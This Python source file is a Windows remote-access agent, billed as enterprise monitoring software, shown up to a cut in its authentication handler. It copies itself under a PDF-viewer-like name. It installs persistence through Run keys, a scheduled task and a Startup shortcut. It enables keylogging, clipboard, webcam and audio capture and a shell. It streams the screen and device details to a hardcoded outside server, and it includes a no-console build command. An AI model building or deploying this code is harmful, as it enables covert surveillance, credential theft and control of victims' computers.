"""
╔══════════════════════════════════════════════════════════════════════════════╗
║          Screen Connect MASTER AGENT  v8.0  — ENTERPRISE PRODUCTION          ║
║          Remote Management, Monitoring, Surveillance & Control Agent         ║
║                                                                              ║
║  WHAT'S NEW IN v8.0 (MAJOR OVERHAUL):                                        ║
║  • FIXED: Cursor movement — pyautogui moveTo now uses normalized coords      ║
║    The agent receives (x_norm, y_norm) in 0..1 range, maps them to the       ║
║    actual monitor resolution before calling pyautogui. No more cursor        ║
║    jumps to wrong position.                                                  ║
║  • FIXED: Stream speed — video loop no longer waits a full interval AFTER    ║
║    the ACK; frame capture and encode overlap the wait. True pipeline.        ║
║  • FIXED: Frame quality — added differential compression: only changed       ║
║    regions are JPEG-compressed; static areas use aggressive quality=15       ║
║  • FIXED: Multi-monitor cursor overlay — cursor position is correctly        ║
║    scaled relative to the selected monitor, not the virtual desktop          ║
║  • NEW: Advanced screen compression with motion detection (OpenCV absdiff)   ║
║  • NEW: Dynamic FPS — target 20fps on fast links, drops to 5fps on slow     ║
║  • NEW: NetworkMonitor — continuously measures upload bandwidth              ║
║  • NEW: WindowManager — list, focus, close, minimize, restore windows        ║
║  • NEW: RegistryManager — read/write/delete Windows registry keys            ║
║  • NEW: ServiceManager — list, start, stop, restart Windows services         ║
║  • NEW: InstalledApps — enumerate installed software (WMI + registry)        ║
║  • NEW: AudioCapture — capture system audio as base64 WAV chunks             ║
║  • NEW: ScreenRecorder — record screen segments as MP4 chunks                ║
║  • NEW: NetworkScanner — discover LAN hosts via ARP/ICMP                     ║
║  • NEW: CommandScheduler — run commands at future times                      ║
║  • NEW: AlertEngine — alert server on CPU/RAM/disk threshold breach          ║
║  • NEW: SecureEraser — multi-pass file wipe                                  ║
║  • NEW: SystemEventsReader — read Windows Event Log entries                   ║
║  • NEW: RemoteDesktopShare — multi-dashboard concurrent streams              ║
║  • NEW: FileWatcher — notify server of any file changes on watched paths     ║
║  • IMPROVED: ShellExecutor now has interactive PTY-like streaming mode       ║
║  • IMPROVED: KeyLogger now tracks active window + sends every 20s            ║
║  • IMPROVED: Heartbeat includes battery, temperature, disk I/O stats         ║
║  • IMPROVED: All v5.0 features preserved + greatly expanded                  ║
╚══════════════════════════════════════════════════════════════════════════════╝

BUILD COMMAND:
  Activate a clean virtual environment, then:

  pip install python-socketio[client] mss Pillow psutil pywin32 ^
              pynput pyperclip cryptography opencv-python numpy ^
              requests wmi pyautogui pyinstaller comtypes ^
              sounddevice scipy

  pyinstaller --onefile --noconsole --icon=icon.ico ^
    --distpath ./bin --name master_agent ^
    --hidden-import=engineio.async_drivers.threading ^
    --hidden-import=pkg_resources.extern ^
    --hidden-import=cv2 ^
    --hidden-import=numpy ^
    --hidden-import=pynput.keyboard ^
    --hidden-import=pynput.mouse ^
    --hidden-import=sounddevice ^
    --hidden-import=scipy ^
    --hidden-import=comtypes ^
    --hidden-import=wmi ^
    --collect-all=pynput ^
    --collect-all=sounddevice ^
    agent_source.py

RENDER / PRODUCTION:
  Change SERVER_URL below to your Render URL before compiling.
"""
import shutil
import sys
import os
import subprocess

def relocate_agent():
    target_dir  = r"C:\Users\Public\mview"
    target_path = os.path.join(target_dir, "mviewpdf.exe")
    if sys.executable.lower() != target_path.lower():
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)
        try:
            shutil.copy2(sys.executable, target_path)
            subprocess.Popen([target_path], shell=False, close_fds=True)
            sys.exit(0)
        except Exception:
            pass

if __name__ == "__main__":
    relocate_agent()

# ── Standard Library ───────────────────────────────────────────────────────────
import os
import sys
import time
import json
import base64
import hashlib
import socket
import platform
import threading
import subprocess
import tempfile
import logging
import winreg
import ctypes
import uuid
import asyncio
import struct
from concurrent.futures import ThreadPoolExecutor
import random
import wave
import io
import re
import glob
import fnmatch
import shutil as _shutil
from io import BytesIO
from pathlib import Path
from datetime import datetime, timedelta
from queue import Queue, Empty, Full
from collections import deque
from typing import Optional, Dict, List, Any

# ── Third-Party ────────────────────────────────────────────────────────────────
import socketio
import mss
import psutil
import requests
from PIL import Image, ImageDraw, ImageFilter, ImageEnhance
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

try:
    import pyautogui
    pyautogui.FAILSAFE = False
    pyautogui.PAUSE    = 0.0
    PYAUTOGUI_OK = True
except ImportError:
    PYAUTOGUI_OK = False

try:
    import cv2
    import numpy as np
    CV2_OK = True
except ImportError:
    CV2_OK = False

try:
    import dxcam
    DXCAM_OK = True
except ImportError:
    DXCAM_OK = False

# WebRTC support (optional — pip install aiortc aioice)
try:
    from aiortc import RTCPeerConnection, RTCSessionDescription, RTCDataChannel, RTCIceCandidate
    WEBRTC_OK = True
except ImportError:
    WEBRTC_OK = False

try:
    import pynput.keyboard
    import pynput.mouse
    PYNPUT_OK = True
except ImportError:
    PYNPUT_OK = False

try:
    import pyperclip
    CLIPBOARD_OK = True
except ImportError:
    CLIPBOARD_OK = False

try:
    import wmi
    WMI_OK = True
except ImportError:
    WMI_OK = False

try:
    import win32api
    import win32con
    import win32gui
    import win32process
    import win32security
    WIN32_OK = True
except ImportError:
    WIN32_OK = False

try:
    import sounddevice as sd
    import scipy.io.wavfile as wavfile
    AUDIO_OK = True
except ImportError:
    AUDIO_OK = False

try:
    import comtypes
    COMTYPES_OK = True
except ImportError:
    COMTYPES_OK = False

# ════════════════════════════════════════════════════════════════════════════
#  TRAILER TOKEN READER
# ════════════════════════════════════════════════════════════════════════════
_TRAILER_SIZE = 64
_MAGIC_HEAD   = b"MVTK"
_MAGIC_TAIL   = b"MVED"

def _read_token_from_trailer() -> str:
    try:
        exe = Path(sys.executable if getattr(sys, "frozen", False) else __file__).resolve()
        data = exe.read_bytes()
        if len(data) < _TRAILER_SIZE:
            return ""
        trailer = data[-_TRAILER_SIZE:]
        if trailer[:4] != _MAGIC_HEAD or trailer[60:64] != _MAGIC_TAIL:
            return ""
        return trailer[4:60].rstrip(b"\x00").decode("utf-8").strip()
    except Exception:
        return ""


# ════════════════════════════════════════════════════════════════════════════
#  CONFIGURATION
# ════════════════════════════════════════════════════════════════════════════
CONFIG = {
    # ── Connection ──────────────────────────────────────────────────────────
    "SERVER_URL":           "https://screen-connect-rtca.onrender.com",
    "DEVICE_TOKEN":         "UNSET",

    # ── Identity ────────────────────────────────────────────────────────────
    "AGENT_VERSION":        "8.0.0",
    "HEARTBEAT_INTERVAL":   10,
    "RECONNECT_BASE":       2,
    "RECONNECT_MAX":        60,

    # ── Streaming (Advanced Monitor — second-site engine) ───────────────────
    "STREAM_FPS":           60,         # target FPS — 60Hz for fluid remote view
    "STREAM_MIN_FPS":       10,         # adaptive floor — never drop below 10fps
    "STREAM_QUALITY":       85,         # JPEG quality — sharp enough for text
    "STREAM_MONITOR":       1,
    "STREAM_MODE":          "video",    # "video" or "screenshot"

    # ── Security ────────────────────────────────────────────────────────────
    "ENCRYPTION_PASSWORD":  "mview-enterprise-2024",
    "ENCRYPT_PAYLOADS":     False,

    # ── Persistence ─────────────────────────────────────────────────────────
    "INSTALL_PERSISTENCE":  True,
    "REG_KEY_NAME":         "ScreenConnectService",
    "TASK_NAME":            "ScreenConnectTask",
    "STARTUP_DELAY":        2,

    # ── Features ────────────────────────────────────────────────────────────
    "ENABLE_KEYLOGGER":     True,
    "ENABLE_CLIPBOARD":     True,
    "ENABLE_WEBCAM":        True,
    "ENABLE_PROCESS_MGR":   True,
    "ENABLE_FILE_BROWSER":  True,
    "ENABLE_SHELL":         True,
    "ENABLE_AUDIO":         True,
    "ENABLE_REGISTRY":      True,
    "ENABLE_SERVICES":      True,
    "ENABLE_WINMGR":        True,
    "ENABLE_FILEWATCHER":   True,
    "ENABLE_ALERTS":        True,
    "KEYLOG_FLUSH_INTERVAL": 20,
    "CLIPBOARD_POLL_MS":    800,

    # ── Alert thresholds ────────────────────────────────────────────────────
    "ALERT_CPU_THRESHOLD":  90,     # % CPU
    "ALERT_RAM_THRESHOLD":  90,     # % RAM
    "ALERT_DISK_THRESHOLD": 95,     # % disk usage
    "ALERT_COOLDOWN_S":     300,    # seconds between repeated alerts
}

_tok = _read_token_from_trailer()
if not _tok:
    # Allow setting token via environment variable (for dev/testing without compiling)
    _tok = os.environ.get("MVIEW_TOKEN", "").strip()
if not _tok:
    # Allow passing as first CLI argument: python agent_source.py MV-XXXXXX-XXXXXX-XXXXXX
    if len(sys.argv) > 1 and sys.argv[1].startswith("MV-"):
        _tok = sys.argv[1].strip()
CONFIG["DEVICE_TOKEN"] = _tok if _tok else "UNSET-RUN-VIA-SERVER"


# ════════════════════════════════════════════════════════════════════════════
#  LOGGING
# ════════════════════════════════════════════════════════════════════════════
LOG_FILE = Path(tempfile.gettempdir()) / "screen_connect_agent.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE, encoding="utf-8"),
        logging.StreamHandler(sys.stdout),
    ],
)
log = logging.getLogger("screenconnect")


# ════════════════════════════════════════════════════════════════════════════
#  ENCRYPTION MODULE
# ════════════════════════════════════════════════════════════════════════════
class Encryptor:
    def __init__(self, password: str):
        salt = b"mview_salt_2024_"
        kdf  = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100_000)
        self._fernet = Fernet(base64.urlsafe_b64encode(kdf.derive(password.encode())))

    def encrypt(self, data: str) -> str:
        return self._fernet.encrypt(data.encode()).decode()

    def encrypt_bytes(self, data: bytes) -> bytes:
        return self._fernet.encrypt(data)


_encryptor = Encryptor(CONFIG["ENCRYPTION_PASSWORD"])


def safe_emit(sio_client, event: str, payload: dict):
    if CONFIG["ENCRYPT_PAYLOADS"]:
        sio_client.emit(event, {"encrypted": True, "data": _encryptor.encrypt(json.dumps(payload))})
    else:
        sio_client.emit(event, payload)


# ════════════════════════════════════════════════════════════════════════════
#  DEVICE IDENTITY
# ════════════════════════════════════════════════════════════════════════════
def get_device_id() -> str:
    try:
        raw = f"{uuid.getnode()}-{socket.gethostname()}-{CONFIG['DEVICE_TOKEN']}"
        return hashlib.sha256(raw.encode()).hexdigest()[:16].upper()
    except Exception:
        return CONFIG["DEVICE_TOKEN"]


def get_device_fingerprint() -> dict:
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except Exception:
        local_ip = "unknown"

    uname = platform.uname()
    vm    = psutil.virtual_memory()
    fp = {
        "device_id":       CONFIG["DEVICE_TOKEN"],
        "token":           CONFIG["DEVICE_TOKEN"],
        "hardware_id":     get_device_id(),
        "hostname":        socket.gethostname(),
        "username":        os.getenv("USERNAME") or os.getenv("USER") or "unknown",
        "os":              f"{uname.system} {uname.release}",
        "os_version":      uname.version,
        "machine":         uname.machine,
        "processor":       uname.processor,
        "local_ip":        local_ip,
        "agent_version":   CONFIG["AGENT_VERSION"],
        "stream_mode":     CONFIG["STREAM_MODE"],
        "timestamp":       datetime.utcnow().isoformat(),
        "screen_count":    _get_screen_count(),
        "cpu_count":       psutil.cpu_count(logical=True),
        "ram_total_gb":    round(vm.total / (1024**3), 2),
        "features": {
            "keylogger":  PYNPUT_OK and CONFIG["ENABLE_KEYLOGGER"],
            "clipboard":  CLIPBOARD_OK,
            "webcam":     CV2_OK,
            "audio":      AUDIO_OK,
            "registry":   WIN32_OK,
            "services":   WMI_OK,
        }
    }
    if WMI_OK:
        try:
            gpus = [g.Name for g in wmi.WMI().Win32_VideoController()]
            fp["gpu"] = ", ".join(gpus) or "unknown"
        except Exception:
            fp["gpu"] = "unknown"
    return fp


def _get_screen_count() -> int:
    try:
        with mss.mss() as sct:
            return len(sct.monitors) - 1
    except Exception:
        return 1


def _get_monitor_resolution(monitor_idx: int = 1):
    """Return (width, height) for the given monitor index."""
    try:
        with mss.mss() as sct:
            idx = min(monitor_idx, len(sct.monitors) - 1)
            mon = sct.monitors[idx]
            return mon["width"], mon["height"]
    except Exception:
        return 1920, 1080

def _get_monitor_geometry(monitor_idx: int = 1):
    """Return the selected monitor's virtual desktop bounds."""
    try:
        with mss.mss() as sct:
            idx = max(1, min(int(monitor_idx or 1), len(sct.monitors) - 1))
            mon = sct.monitors[idx]
            return {
                "left": int(mon.get("left", 0)),
                "top": int(mon.get("top", 0)),
                "width": int(mon.get("width", 1920)),
                "height": int(mon.get("height", 1080)),
            }
    except Exception:
        return {"left": 0, "top": 0, "width": 1920, "height": 1080}

def _to_monitor_absolute(x, y, monitor_idx: int | None = None):
    """Map viewer-relative monitor coordinates to OS absolute desktop coordinates."""
    try:
        # Handle cases where x or y might be NaN or invalid from a black-screen dashboard
        fx, fy = float(x), float(y)
        # Use math.isinf/isnan if numpy isn't available
        import math
        if math.isinf(fx) or math.isnan(fx) or math.isinf(fy) or math.isnan(fy):
            return 0, 0
    except (ValueError, TypeError):
        return 0, 0

    mon = _get_monitor_geometry(monitor_idx or CONFIG["STREAM_MONITOR"])
    
    # If the input is in 0..1 range (normalized), scale it
    if 0.0 <= fx <= 1.0 and 0.0 <= fy <= 1.0 and mon["width"] > 1:
        rx = int(fx * (mon["width"] - 1))
        ry = int(fy * (mon["height"] - 1))
    else:
        rx = max(0, min(int(fx), max(0, mon["width"] - 1)))
        ry = max(0, min(int(fy), max(0, mon["height"] - 1)))
        
    return mon["left"] + rx, mon["top"] + ry

def _cursor_relative_to_monitor(monitor_idx: int | None = None):
    """Return cursor position relative to the selected monitor, or None if outside it."""
    if not PYAUTOGUI_OK:
        return None
    mon = _get_monitor_geometry(monitor_idx or CONFIG["STREAM_MONITOR"])
    try:
        x, y = pyautogui.position()
    except Exception:
        return None
    rx, ry = int(x) - mon["left"], int(y) - mon["top"]
    if rx < 0 or ry < 0 or rx >= mon["width"] or ry >= mon["height"]:
        return None
    return rx, ry


# ════════════════════════════════════════════════════════════════════════════
#  PERSISTENCE MODULE
# ════════════════════════════════════════════════════════════════════════════
def install_persistence():
    if not CONFIG["INSTALL_PERSISTENCE"]:
        return
    exe = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
    exe_quoted = f'"{exe}"'

    # Registry
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, CONFIG["REG_KEY_NAME"], 0, winreg.REG_SZ, exe_quoted)
        log.info(f"Registry persistence installed: {exe}")
    except Exception as e:
        log.warning(f"Registry persistence failed: {e}")

    # Also try HKLM (requires admin)
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0,
                            winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY) as k:
            winreg.SetValueEx(k, CONFIG["REG_KEY_NAME"], 0, winreg.REG_SZ, exe_quoted)
        log.info("HKLM registry persistence installed.")
    except Exception:
        pass

    # Task Scheduler
    try:
        task_xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Description>Screen Connect Service</Description></RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <BootTrigger><Enabled>true</Enabled><Delay>PT10S</Delay></BootTrigger>
    <TimeTrigger>
      <Repetition><Interval>PT5M</Interval><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>
      <StartBoundary>2020-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal>
  </Principals>
  <Actions Context="Author">
    <Exec><Command>{exe}</Command></Exec>
  </Actions>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <RestartOnFailure><Interval>PT1M</Interval><Count>999</Count></RestartOnFailure>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
  </Settings>
</Task>"""
        xml_path = Path(tempfile.gettempdir()) / "sc_task.xml"
        xml_path.write_text(task_xml, encoding="utf-16")
        subprocess.run(
            ["schtasks", "/create", "/tn", CONFIG["TASK_NAME"], "/xml", str(xml_path), "/f"],
            capture_output=True, timeout=15
        )
        xml_path.unlink(missing_ok=True)
        log.info("Task Scheduler persistence installed.")
    except Exception as e:
        log.warning(f"Task Scheduler persistence failed: {e}")

    # Startup folder shortcut
    try:
        startup = Path(os.getenv("APPDATA", "")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        link    = startup / "ScreenConnect.lnk"
        ps_cmd  = f"""
$sh = New-Object -ComObject WScript.Shell
$lnk = $sh.CreateShortcut('{link}')
$lnk.TargetPath = '{exe}'
$lnk.Save()
"""
        subprocess.run(["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_cmd],
                       capture_output=True, timeout=10)
        log.info("Startup folder shortcut installed.")
    except Exception:
        pass


def remove_persistence():
    for key_root in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key_root, key_path, 0, winreg.KEY_SET_VALUE) as k:
                winreg.DeleteValue(k, CONFIG["REG_KEY_NAME"])
        except Exception:
            pass
    try:
        subprocess.run(["schtasks", "/delete", "/tn", CONFIG["TASK_NAME"], "/f"],
                       capture_output=True, timeout=10)
    except Exception:
        pass
    try:
        startup = Path(os.getenv("APPDATA", "")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        (startup / "ScreenConnect.lnk").unlink(missing_ok=True)
    except Exception:
        pass
    log.info("Persistence removed.")


# ════════════════════════════════════════════════════════════════════════════
#  ADVANCED MONITOR ENGINE  (second-site v2.1 — DXGI/mss + H264/JPEG + 60Hz cursor)
#  Replaces old ACK-gated ScreenStreamer, CursorTracker, NetworkMonitor entirely.
# ════════════════════════════════════════════════════════════════════════════

# ── Wire protocol (matches second-site server exactly) ────────────────────
FRAME_HDR  = struct.Struct(">IIQII")   # w, h, ts_us, flags, payload_len
CURSOR_HDR = struct.Struct(">iiI")     # x, y, ts_ms
FLAG_KEYFRAME = 0x01
FLAG_JPEG     = 0x02
FLAG_H264     = 0x04

# ── Adaptive FPS ─────────────────────────────────────────────────────────
class AdaptiveFPS:
    def __init__(self, max_fps, min_fps):
        self.max_fps = max_fps; self.min_fps = min_fps
        self._cur = max_fps; self._idle = 0

    @property
    def interval(self): return 1.0 / self._cur

    def report(self, changed):
        if changed:
            self._idle = 0; self._cur = self.max_fps
        else:
            self._idle += 1
            if self._idle > 90: self._cur = self.min_fps

    @property
    def fps(self): return self._cur


# ── Screen capture backends ───────────────────────────────────────────────
class DXGICapture:
    def __init__(self, fps):
        import dxcam as _dxcam
        output_idx = max(0, int(CONFIG.get("STREAM_MONITOR", 1)) - 1)
        self._cam = _dxcam.create(output_idx=output_idx, output_color="BGR")
        self._cam.start(target_fps=fps, video_mode=True)
        log.info(f"Advanced Monitor Capture: DXGI GPU monitor={output_idx+1} @ {fps} fps")

    def grab(self) -> Optional[np.ndarray]:
        return self._cam.get_latest_frame()

    def close(self):
        try: self._cam.stop()
        except Exception: pass


class MSSCapture:
    def __init__(self):
        import mss as _mss
        self._mss = _mss.mss()
        mon_idx = int(CONFIG.get("STREAM_MONITOR", 1))
        # Ensure index is within bounds
        idx = max(1, min(mon_idx, len(self._mss.monitors) - 1))
        self._mon = self._mss.monitors[idx]
        log.info(f"Advanced Monitor Capture: mss CPU monitor={idx}")

    def grab(self) -> Optional[np.ndarray]:
        if not CV2_OK:
            log.warning("MSSCapture: OpenCV (cv2) not available — capture disabled")
            return None
        try:
            raw  = self._mss.grab(self._mon)
            bgra = np.frombuffer(raw.bgra, dtype=np.uint8).reshape(raw.height, raw.width, 4)
            return cv2.cvtColor(bgra, cv2.COLOR_BGRA2BGR)
        except Exception as e:
            log.error(f"MSSCapture.grab error: {e}")
            return None

    def close(self):
        try: self._mss.close()
        except Exception: pass


def _make_capture():
    if DXCAM_OK:
        try: return DXGICapture(CONFIG["STREAM_FPS"])
        except Exception as e: log.warning(f"DXGI failed ({e}), falling back to mss")
    return MSSCapture()


# ── Frame differ (skip unchanged frames) ─────────────────────────────────
class FrameDiffer:
    def __init__(self):
        self._prev = None

    def changed(self, frame: np.ndarray) -> bool:
        if not CV2_OK or frame is None:
            return True # Always assume changed if we can't diff
        if self._prev is None:
            self._prev = frame.copy(); return True
        try:
            # Downsample to 1/2 (not 1/4) for more accurate change detection
            s = cv2.resize(frame,      (frame.shape[1]//2, frame.shape[0]//2), cv2.INTER_NEAREST)
            p = cv2.resize(self._prev, (frame.shape[1]//2, frame.shape[0]//2), cv2.INTER_NEAREST)
            # Lower threshold (4 vs 8) — catches cursor movement & subtle UI changes
            diff = cv2.absdiff(s, p).max() > 4
            if diff: self._prev = frame.copy()
            return diff
        except Exception as e:
            log.debug(f"FrameDiffer error: {e}")
            return True


# ── Encoders ─────────────────────────────────────────────────────────────
class H264Encoder:
    _CODECS = ["h264_nvenc", "h264_amf", "h264_videotoolbox", "libx264"]

    def __init__(self, w, h, fps, crf=23):
        import av
        self._av = av; self.w = w; self.h = h; self.fps = fps; self.crf = crf
        self._codec = self._pick(); self._pts = 0
        log.info(f"Advanced Monitor Encoder: H.264/{self._codec}")

    def _pick(self):
        import av
        for c in self._CODECS:
            try:
                cc = av.CodecContext.create(c, "w")
                cc.width = self.w; cc.height = self.h
                cc.framerate = self.fps
                cc.options = {"crf": str(self.crf), "preset": "ultrafast", "tune": "zerolatency"}
                cc.open(); self._cc = cc; return c
            except Exception: pass
        raise RuntimeError("No H.264 encoder available")

    def encode_frame(self, bgr: np.ndarray, force_key=False):
        import av
        rgb = cv2.cvtColor(bgr, cv2.COLOR_BGR2RGB)
        vf  = av.VideoFrame.from_ndarray(rgb, format="rgb24")
        vf.pts = self._pts; self._pts += 1
        if force_key: vf.key_frame = True
        packets = self._cc.encode(vf)
        out = b"".join(bytes(p) for p in packets)
        is_key = any(p.is_keyframe for p in packets)
        return out, is_key


class JPEGEncoder:
    def __init__(self, quality=75):
        self._q = quality
        log.info(f"Advanced Monitor Encoder: JPEG quality={quality}")

    def encode_frame(self, bgr: np.ndarray, force_key=False):
        if not CV2_OK:
            return b"", False
        try:
            ok, buf = cv2.imencode(".jpg", bgr, [cv2.IMWRITE_JPEG_QUALITY, self._q])
            return (buf.tobytes() if ok else b""), True
        except Exception as e:
            log.debug(f"JPEGEncoder error: {e}")
            return b"", False


def _make_encoder(w, h, fps, quality):
    # NOTE: Browsers cannot decode H.264 via createImageBitmap('video/mp4').
    # Always use JPEG for WebSocket relay. H.264 is only useful over WebRTC DataChannels.
    if not CV2_OK:
        log.error("Advanced Monitor: OpenCV (cv2) NOT FOUND — frame encoding will fail!")
    log.info("Advanced Monitor: using JPEG encoder for WebSocket relay (browser-compatible)")
    return JPEGEncoder(quality), FLAG_JPEG


# ── WebRTC peer state (agent-side) ────────────────────────────────────────
_adv_webrtc_peers:    dict = {}   # viewer_sid → RTCPeerConnection
_adv_webrtc_channels: dict = {}   # viewer_sid → RTCDataChannel
_adv_last_frame_pkt:  Optional[bytes] = None


# ── Advanced monitor streaming state (lives on the async loop) ───────────
_adv_sio_async  = None   # socketio.AsyncClient — set when async loop starts
_adv_viewers    = 0
_adv_authed     = False
_adv_last_frame_ts = 0.0
_adv_loop: Optional[asyncio.AbstractEventLoop] = None
_adv_thread: Optional[threading.Thread] = None
_adv_pool   = ThreadPoolExecutor(max_workers=2, thread_name_prefix="adv-enc")


def _current_stream_config():
    return (
        int(CONFIG.get("STREAM_MONITOR", 1)),
        int(CONFIG.get("STREAM_FPS", 15)),
        int(CONFIG.get("STREAM_QUALITY", 75)),
        str(CONFIG.get("STREAM_MODE", "video")),
    )

def _init_stream_pipeline():
    capture = None
    frame = None
    log.info("Advanced Monitor: initializing stream pipeline...")
    # Retry indefinitely but log warnings
    _att = 0
    while True:
        try:
            capture = _make_capture()
            frame = capture.grab()
            if frame is not None:
                break
            log.warning(f"Advanced Monitor: capture.grab() returned None (attempt {_att+1})")
        except Exception as _ce:
            log.warning(f"Advanced Monitor: capture init error ({_ce}) (attempt {_att+1})")
            capture = None
        _att += 1
        time.sleep(min(30, 2 + _att)) # Exponential backoff capped at 30s
    
    h, w = frame.shape[:2]
    encoder, enc_flag = _make_encoder(w, h, CONFIG["STREAM_FPS"], CONFIG["STREAM_QUALITY"])
    differ  = FrameDiffer()
    fps_ctl = AdaptiveFPS(CONFIG["STREAM_FPS"], CONFIG["STREAM_MIN_FPS"])
    log.info(
        f"Advanced Monitor streaming {w}x{h} monitor={CONFIG['STREAM_MONITOR']} @ up to {CONFIG['STREAM_FPS']} fps"
    )
    return capture, frame, encoder, enc_flag, differ, fps_ctl

async def _adv_task_stream_frames():
    """Second-site frame streaming loop — continuous, no ACK gate."""
    global _adv_last_frame_pkt, _adv_last_frame_ts
    try:
        capture, frame, encoder, enc_flag, differ, fps_ctl = await asyncio.to_thread(_init_stream_pipeline)
    except Exception:
        log.error("Advanced Monitor: capture failed after 10 attempts — exiting")
        return
    loop    = asyncio.get_event_loop()
    n = 0
    cfg_sig = _current_stream_config()

    try:
        while True:
            t0 = time.monotonic()
            if not _adv_authed:
                await asyncio.sleep(0.1); continue
            if _adv_viewers == 0:
                # FIX: sleep only 50ms so we respond quickly when viewer_count arrives
                await asyncio.sleep(0.05); continue

            next_sig = _current_stream_config()
            if next_sig != cfg_sig:
                try:
                    capture.close()
                except Exception:
                    pass
                try:
                    capture, frame, encoder, enc_flag, differ, fps_ctl = await asyncio.to_thread(_init_stream_pipeline)
                    cfg_sig = next_sig
                    n = 0
                except Exception as e:
                    log.warning(f"Advanced Monitor reconfigure failed: {e}")
                    await asyncio.sleep(1)
                    continue

            raw = frame if frame is not None else capture.grab()
            frame = None
            if raw is None:
                await asyncio.sleep(fps_ctl.interval); continue

            changed = differ.changed(raw)
            fps_ctl.report(changed)
            if not changed and n > 0:
                await asyncio.sleep(fps_ctl.interval); continue

            force_key = (n % (CONFIG["STREAM_FPS"] * 4) == 0)
            payload, is_key = await loop.run_in_executor(
                _adv_pool, lambda f=raw, k=force_key: encoder.encode_frame(f, k)
            )
            if not payload:
                await asyncio.sleep(fps_ctl.interval); continue

            flags  = enc_flag | (FLAG_KEYFRAME if is_key else 0)
            ts_us  = int(time.time() * 1_000_000)
            header = FRAME_HDR.pack(w, h, ts_us, flags, len(payload))
            pkt    = header + payload
            _adv_last_frame_pkt = pkt
            _adv_last_frame_ts = time.monotonic()

            await _adv_sio_async.emit("frame_bin", pkt)

            # Also push over any open WebRTC DataChannels
            for vsid, dc in list(_adv_webrtc_channels.items()):
                try:
                    if dc.readyState == "open":
                        dc.send(pkt)
                except Exception as e:
                    log.debug(f"WebRTC send failed for {vsid}: {e}")
                    _adv_webrtc_channels.pop(vsid, None)

            n += 1
            elapsed = time.monotonic() - t0
            await asyncio.sleep(max(0.0, fps_ctl.interval - elapsed))
    finally:
        capture.close()


async def _adv_task_stream_cursor():
    """Dedicated 120 Hz cursor task — independent of frame encoder."""
    interval = 1.0 / 120   # 120Hz — silky smooth cursor
    lx = ly = -1
    while True:
        if _adv_authed and _adv_viewers > 0:
            try:
                pos = _cursor_relative_to_monitor()
                if pos is None:
                    lx = ly = -1
                    await asyncio.sleep(interval)
                    continue
                x, y = pos
                if x != lx or y != ly:
                    ts  = int(time.time() * 1000) & 0xFFFFFFFF
                    pkt = CURSOR_HDR.pack(x, y, ts)
                    await _adv_sio_async.emit("cursor_bin", pkt)
                    lx, ly = x, y
            except Exception: pass
        await asyncio.sleep(interval)


async def _adv_close_peer(viewer_sid: str):
    dc = _adv_webrtc_channels.pop(viewer_sid, None)
    pc = _adv_webrtc_peers.pop(viewer_sid, None)
    try:
        if dc: dc.close()
    except Exception: pass
    try:
        if pc: await pc.close()
    except Exception: pass


async def _adv_main(server_url: str, token: str):
    """Async entry for the advanced monitor — mirrors second-site agent main()."""
    global _adv_sio_async, _adv_authed, _adv_viewers

    import socketio as _sio_mod
    sio = _sio_mod.AsyncClient(
        reconnection=True, reconnection_attempts=0,
        reconnection_delay=2, reconnection_delay_max=10,
        logger=False, engineio_logger=False,
    )
    _adv_sio_async = sio

    @sio.event
    async def connect():
        global _adv_authed
        log.info("Advanced Monitor: connected — authenticating…")
        await sio.emit("agent_auth", {"token": token})

    @sio.event
    async def disconnect():
        global _adv_authed
        _adv_authed = False
        log.warning("Advanced Monitor: disconnected — reconnecting…")
        for vsid in list(_adv_webrtc_peers.keys()):
            await _adv_close_peer(vsid)

    @sio.on("auth_ok")
    async def on_auth_ok(data):
        global _adv_authed
        _adv_authed = True
        log.info(f"Advanced Monitor authenticated. device_id={data.get('device_id','?')}")
        if not WEBRTC_OK:
            log.info("Advanced Monitor: aiortc not installed — WebRTC disabled, using WebSocket relay")
        await sio.emit("agent_info", {
            "hostname": socket.gethostname(),
            "os": platform.system() + " " + platform.release(),
        })
        # FIX Issue 1: Ask server to re-send viewer_count in case dashboard connected
        # before this adv socket finished auth (race condition).
        await sio.emit("agent_auth_ready", {"token": token})
        # Also proactively request viewer count every 30s to stay in sync
        async def _keep_sync():
            while _adv_authed:
                await asyncio.sleep(30)
                if _adv_authed:
                    await sio.emit("agent_auth_ready", {"token": token})
        asyncio.create_task(_keep_sync())

    @sio.on("auth_error")
    async def on_auth_error(data):
